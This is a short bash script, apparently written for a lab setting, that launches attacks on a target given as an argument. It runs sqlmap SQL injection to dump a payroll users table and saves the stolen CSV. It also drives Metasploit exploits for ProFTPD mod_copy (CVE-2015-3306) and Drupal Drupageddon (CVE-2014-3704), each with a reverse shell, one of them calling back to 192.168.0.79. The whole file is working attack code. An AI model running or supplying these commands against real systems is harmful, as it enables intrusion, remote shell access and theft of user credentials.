#!/bin/bash

ATTACK=$1
TARGET=$2


if [ $ATTACK == "1" ]
then 
	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dump 
	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
elif [ $ATTACK == "CVE-2015-3306" ]
then
	msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run; exit; " 
	pid=$!
	echo $pid
	kill -INT $pid
elif [ $ATTACK == "CVE-2014-3704" ]
then 
	msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set rhost $TARGET; set targeturi /drupal/; set payload php/reverse_perl; set lhost 192.168.0.79; exploit;"
else
	echo "Not valid. Enter either 1 or 2"
fi
